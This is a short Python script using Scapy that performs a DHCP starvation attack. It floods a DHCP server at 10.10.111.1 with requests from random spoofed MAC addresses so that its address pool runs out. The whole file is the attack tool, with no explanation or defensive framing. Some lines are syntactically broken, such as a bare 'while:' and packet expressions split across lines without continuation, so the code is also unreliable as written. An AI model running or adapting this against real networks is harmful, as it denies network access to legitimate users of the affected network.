from scapy.all import *
from time import sleep
from threading import Thread
class Starvation(object):
    def __init__(self):
        self.mac, self.ip = [""], [""]
    def analysis(self, pkt):
        if pkt[DHCP]:
            if pkt[DHCP].options[0][1]==5:
                self.ip.append(pkt[IP].dst)
                print "Register Successfully"
            elif pkt[DHCP].options[0][1]==6:
                print "NAK Repsonse"
    def sniffing(self):
        sniff(filter="udp and (port 67 or port 68)", prn=self.analysis, store=0)
    def start(self):
        while:
            thread = Thread(target=self.sniffing)
            thread.start()
            print "DHCP Starving..."
            while len(self.ip) < 100:
                self.starve()
            sleep(60)
    def starve(self):
        for i in xrange(100):
            requested_addr = "10.10.111."+str(101+i)
            if requested_addr in self.ip:
                continue
            src_mac = RandMAC()                
            self.mac.append(src_mac)
            pkt = Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff")
                /IP(src="0.0.0.0", dst="255.255.255.255")
                /UDP(sport=68, dport=67)/BOOTP(chaddr=src_mac)
                /DHCP(options=[("message-type", "request"),("requested_addr", requested_addr),("server_id", "10.10.111.1"),"end"])
            sendp(pkt)
            sleep(0.1)
if __name__ == "__main__":
    attack = Starvation()
    attack.start()